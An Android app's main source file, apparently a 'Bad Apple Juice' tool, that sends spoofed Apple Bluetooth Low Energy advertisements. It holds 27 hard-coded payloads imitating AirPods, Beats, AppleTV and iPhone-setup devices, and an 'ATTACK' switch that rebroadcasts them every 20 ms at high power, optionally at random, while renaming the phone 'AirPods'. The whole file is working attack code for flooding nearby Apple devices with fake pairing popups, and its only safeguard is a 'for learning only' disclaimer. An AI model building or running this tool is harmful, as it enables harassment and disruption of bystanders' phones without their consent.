package cn.sab1e.badapplejuice;

import static android.content.ContentValues.TAG;
import static android.content.pm.PackageManager.PERMISSION_GRANTED;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.annotation.SuppressLint;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.le.AdvertiseCallback;
import android.bluetooth.le.AdvertiseData;
import android.bluetooth.le.AdvertiseSettings;
import android.bluetooth.le.BluetoothLeAdvertiser;
import android.bluetooth.BluetoothManager;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.icu.util.Calendar;
import android.os.Build;
import android.os.Bundle;
import android.os.ParcelUuid;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.CompoundButton;
import android.widget.EditText;
import android.widget.Spinner;
import android.widget.Switch;
import android.widget.TextView;
import android.widget.Toast;
import android.content.Intent;

import java.nio.charset.Charset;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.UUID;
import java.util.Random;

public class MainActivity extends AppCompatActivity {

    private BluetoothLeAdvertiser bluetoothLeAdvertiser;
    private BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
    public byte[][] deviceData = {
            {0x07, 0x19, 0x07, 0x02, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x13, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x14, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x03, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x11, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x10, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x05, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x06, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x09, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x17, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x12, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x16, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x01, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x20, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x2b, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x0d, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x13, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x27, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x0b, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x09, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x02, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x1e, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
    };
    //private byte[][] testData = {{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}};
    private String[] deviceNameArr = {
            "AirPods",
            "AirPods Pro",
            "AirPods Max",
            "AirPods",
            "AirPods",
            "AirPods Pro",
            "Powerbeats3",
            "Powerbeats Pro",
            "Beats Solo Pro",
            "Beats Studio Buds",
            "Beats Flex",
            "BeatsX",
            "Beats Solo3",
            "Beats Studio3",
            "Beats Studio Pro",
            "Beats Fit Pro",
            "Beats Studio Buds +",
            "设置AppleTV",
            "配对AppleTV",
            "AppleTV 验证AppleID",
            "AppleTV 隔空投放和HomeKit",
            "AppleTV键盘",
            "正在连接AppleTV",
            "HomePod",
            "设置新iPhone",
            "转移手机号码",
            "测量TV色彩平衡"
    };
    private String[] advModeName = {
            "低功耗模式 1000ms延迟",
            "平衡模式 250ms延迟",
            "低延迟模式 100ms延迟"
    };
    private int advMode = 2;
    private String[] txModeName = {
            "超低功率发送模式 广播距离最近",
            "低功率发送模式 广播距离近",
            "中功率发送模式 广播距离中",
            "高功率发送模式 广播距离远"
    };
    private int txMode = 3;
    private String helpString = null;
    private int spIndex = 0;
    private boolean deviceIsRandom = false;
    private boolean isStopThread = false;
    private int advTimeout = 1000;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Spinner sp_SelectDevice = null;
        Spinner sp_advMode = null;
        Spinner sp_txMode = null;

        sp_SelectDevice = findViewById(R.id.sp_SelectDevice);
        sp_advMode = findViewById(R.id.sp_AdvMode);
        sp_txMode = findViewById(R.id.sp_TxMode);

        Switch sw_ATTACK = findViewById(R.id.sw_ATTACK);
        Switch sw_RandomDevice = findViewById(R.id.sw_RandomDevice);
        Button btn_help = findViewById(R.id.btn_help);
        TextView tv_Debug = findViewById(R.id.tv_Debug);
        TextView tv_advState = findViewById(R.id.tv_advState);
        EditText et_Timeout = findViewById(R.id.et_Timeout);

        Spinner devSpinner = findViewById(R.id.sp_SelectDevice);
        Spinner advModeSpinner = findViewById(R.id.sp_AdvMode);
        Spinner txModeSpinner = findViewById(R.id.sp_TxMode);


        Random random = new Random(100);
        tv_Debug.setMovementMethod(ScrollingMovementMethod.getInstance());


        ArrayAdapter<String> devAdapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1,deviceNameArr);
        sp_SelectDevice.setAdapter(devAdapter);
        sp_SelectDevice.setSelection(0);

        ArrayAdapter<String> advModeAdapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1,advModeName);
        sp_advMode.setAdapter(advModeAdapter);
        sp_advMode.setSelection(2);

        ArrayAdapter<String> txModeAdapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1,txModeName);
        sp_txMode.setAdapter(txModeAdapter);
        sp_txMode.setSelection(3);

        bluetoothLeAdvertiser = bluetoothAdapter.getBluetoothLeAdvertiser();

        String patten = "HH:mm:ss.SSS";
        SimpleDateFormat format = new SimpleDateFormat(patten);

        helpString = "\n当前版本号：v"
                + getVersionName()
                + "\n作者：Sab1e\n"
                + "\n程序功能介绍：\n"
                + "\n随机设备：从27个设备中随机选取。\n"
                + "\n广播包超时时间：设置单个广播包持续广播的时间，最长为180000ms，设置为0即无时间限制。建议值：1000ms\n"
                + "\n广播包模式：控制广播包的延迟。\n"
                + "\n广播包发送功率：控制广播包发送范围。\n"
                + "\n该工具仅用于学习和交流使用，作者不承担用户使用该工具的任何后果。";

        tv_Debug.setText(helpString);

        btn_help.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                tv_Debug.setText(helpString);
            }
        });
        sw_RandomDevice.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if(isChecked == true){
                    deviceIsRandom = true;
                }
                else{
                    deviceIsRandom = false;
                }
            }
        });
        sw_ATTACK.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            @Override
            @SuppressLint("MissingPermission")
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if (isChecked == true) {
                    isStopThread = false;
                    tv_Debug.setText("");
                    tv_Debug.append("正在进行各项检测");
                    tv_Debug.append(".");
                    if (bluetoothAdapter == null) {
                        tv_Debug.append("\n您的设备不支持蓝牙功能！\n");
                        sw_ATTACK.setChecked(false);
                        return;
                    } else {
                    }
                    tv_Debug.append(".");
                    if (bluetoothAdapter.isEnabled()) {
                    } else {
                        tv_Debug.append("\n蓝牙已关闭\n请打开蓝牙后重试\n");
                        sw_ATTACK.setChecked(false);
                        return;
                    }
                    tv_Debug.append(".");
                    if (!(bluetoothAdapter.isOffloadedFilteringSupported() ||
                            bluetoothAdapter.isOffloadedScanBatchingSupported() ||
                            bluetoothAdapter.isMultipleAdvertisementSupported())) {
                        tv_Debug.append("\n您的设备不支持BLE广播功能！\n");
                        sw_ATTACK.setChecked(false);
                        return;
                    }
                    tv_Debug.append("\n检测完毕，功能正常！\n");
                    tv_Debug.append("正在获取蓝牙权限...\n");
                    if (bluePermission()) {
                        new Thread(new Runnable() {
                            @Override
                            public void run() {
                                while (true) {
                                    try {

                                        advTimeout = Integer.parseInt(et_Timeout.getText().toString());
                                        if (deviceIsRandom) {
                                            spIndex = random.nextInt(26);
                                        } else {
                                            spIndex = devSpinner.getSelectedItemPosition();
                                        }
                                        advMode = advModeSpinner.getSelectedItemPosition();
                                        txMode = txModeSpinner.getSelectedItemPosition();
                                        tv_advState.setText("@" + format.format(new Date()) + " \t"+ deviceNameArr[spIndex] + "\n");
                                        startAdv(getDevice(deviceData, spIndex));
                                        Thread.sleep(20);
                                        if (isStopThread) {
                                            stopAdv();
                                            break;
                                        }
                                    } catch (InterruptedException e) {
                                        throw new RuntimeException(e);
                                    }
                                }
                            }
                        }).start();
                    }else {
                        tv_Debug.append("请授权后重试\n");
                        sw_ATTACK.setChecked(false);
                    }
                }
                else {

                    tv_advState.setText("广播已停止");
                    isStopThread = true;
                }
            }
        });
    }

    private String getVersionName()
    {
        PackageManager packageManager = getPackageManager();
        PackageInfo packInfo = null;
        try {
            packInfo = packageManager.getPackageInfo(getPackageName(),0);
        } catch (PackageManager.NameNotFoundException e) {
            throw new RuntimeException(e);
        }
        String version = packInfo.versionName;
        return version;
    }
    private byte[] getDevice(byte[][] arr,int num){
        byte[] selected = arr[num];
        return selected;
    }
    private boolean bluePermission(){
        Log.e( "BLE","Requesting Bluetooth Permission...");
            if (ContextCompat.checkSelfPermission(this,
                    "android.permission.BLUETOOTH_SCAN")
                    != PERMISSION_GRANTED
                    || ContextCompat.checkSelfPermission(this,
                    "android.permission.BLUETOOTH_ADVERTISE")
                    != PERMISSION_GRANTED
                    || ContextCompat.checkSelfPermission(this,
                    "android.permission.BLUETOOTH_ADMIN")
                    != PERMISSION_GRANTED
                    || ContextCompat.checkSelfPermission(this,
                    "android.permission.BLUETOOTH_CONNECT")
                    != PERMISSION_GRANTED
                    || ContextCompat.checkSelfPermission(this,
                    "android.permission.BLUETOOTH")
                    != PERMISSION_GRANTED
                    || ContextCompat.checkSelfPermission(this,
                    "android.permission.ACCESS_COARSE_LOCATION")
                    != PERMISSION_GRANTED
            ){
                ActivityCompat.requestPermissions(this,new String[]{
                        "android.permission.BLUETOOTH_SCAN",
                        "android.permission.BLUETOOTH_ADVERTISE",
                        "android.permission.BLUETOOTH_CONNECT",
                        "android.permission.ACCESS_COARSE_LOCATION",
                        "android.permission.BLUETOOTH",
                        "android.permission.BLUETOOTH_ADMIN"}, 1);
                return false;
            }
        return true;
    }
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 1) {
            if (grantResults[0] == PERMISSION_GRANTED) {
            } else {
                Toast.makeText(this, "程序需要获取权限！", Toast.LENGTH_SHORT).show();
            }
        }
    }
    @SuppressLint("MissingPermission")
    private void stopAdv(){
        AdvertiseCallback advertisingCallback = new AdvertiseCallback() {
            @Override
            public void onStartSuccess(AdvertiseSettings settingsInEffect) {
                super.onStartSuccess(settingsInEffect);
                Log.i( "BLE", "Advertising State: " + settingsInEffect);
            }
            @Override
            public void onStartFailure(int errorCode) {
                super.onStartFailure(errorCode);
                Log.e( "BLE", "Advertising onStartFailure: " + errorCode );
            }
        };
        if (bluePermission()) {
            bluetoothLeAdvertiser.stopAdvertising(advertisingCallback);
        }
    }
    @SuppressLint("MissingPermission")
    public void startAdv(byte[] data){
        AdvertiseSettings settings = new AdvertiseSettings.Builder()
                .setAdvertiseMode( advMode )
                .setTxPowerLevel( txMode )
                .setConnectable( false )
                .setTimeout(advTimeout)
                .build();
        AdvertiseData Data = new AdvertiseData.Builder()
                .setIncludeDeviceName(false)
                .setIncludeTxPowerLevel(false)
                .addManufacturerData(0x004c,data)
                .build();
        AdvertiseData scanData = new AdvertiseData.Builder()
                .setIncludeTxPowerLevel(true)
                .setIncludeDeviceName(true)
                .build();
        AdvertiseCallback advertisingCallback = new AdvertiseCallback() {
            @Override
            public void onStartSuccess(AdvertiseSettings settingsInEffect) {
                super.onStartSuccess(settingsInEffect);
                Log.i( "BLE", "Advertising State: " + settingsInEffect );
            }
            @Override
            public void onStartFailure(int errorCode) {
                super.onStartFailure(errorCode);
                Log.e( "BLE", "Advertising onStartFailure: " + errorCode );
            }
        };
        if (bluePermission()) {
            Log.d("BLE","Advertising Successful!");
            bluetoothAdapter.setName("AirPods");
            bluetoothLeAdvertiser.startAdvertising(settings, Data, scanData, advertisingCallback);
        } else {
            Log.e("BLE","Advertising Failed! Need Permission.");
            Toast.makeText(this, "程序需要获取权限！", Toast.LENGTH_SHORT).show();
        }
    }
}